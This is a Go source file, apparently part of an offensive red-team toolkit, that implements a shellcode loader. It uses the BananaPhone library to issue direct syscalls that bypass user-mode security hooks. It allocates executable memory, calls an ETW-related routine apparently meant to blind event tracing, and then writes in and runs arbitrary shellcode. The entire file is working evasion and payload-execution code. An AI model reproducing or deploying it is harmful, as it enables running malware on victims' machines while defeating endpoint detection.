package loader

import (
	"fmt"
	"syscall"
	"unsafe"

	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
)
//example of using bananaphone to execute shellcode in the current thread.
func Load(shellcode []byte) {
	fmt.Println("Mess with the banana, die like the... banana?") //I found it easier to breakpoint the consolewrite function to mess with the in-memory ntdll to verify the auto-switch to disk works sanely than to try and live-patch it programatically.

	bp, e := bananaphone.NewBananaPhone(bananaphone.DiskBananaPhoneMode)
	if e != nil {
		panic(e)
	}
	//resolve the functions and extract the syscalls
	//resolve the functions and extract the syscalls
	alloc, e := bp.GetSysID("NtAllocateVirtualMemory")
	if e != nil {
		panic(e)
	}

	createThread(shellcode,uintptr(0xffffffffffffffff),alloc)
}

func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid uint16) {
	const (
		//thisThread = uintptr(0xffffffffffffffff) //special macro that says 'use this thread/process' when provided as a handle.
		memCommit  = uintptr(0x00001000)
		memreserve = uintptr(0x00002000)
	)
	shellcode = append(shellcode,[]byte("0x00")[0])
	var baseA uintptr
	regionsize := uintptr(len(shellcode))
	r1, r := bananaphone.Syscall(
		NtAllocateVirtualMemorySysid, //ntallocatevirtualmemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(memCommit|memreserve),
		syscall.PAGE_EXECUTE_READWRITE,
	)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
	etw(uintptr(handle))

	//write memory
	bananaphone.WriteMemory(shellcode, baseA)

	syscall.Syscall(baseA, 0, 0, 0, 0)

}

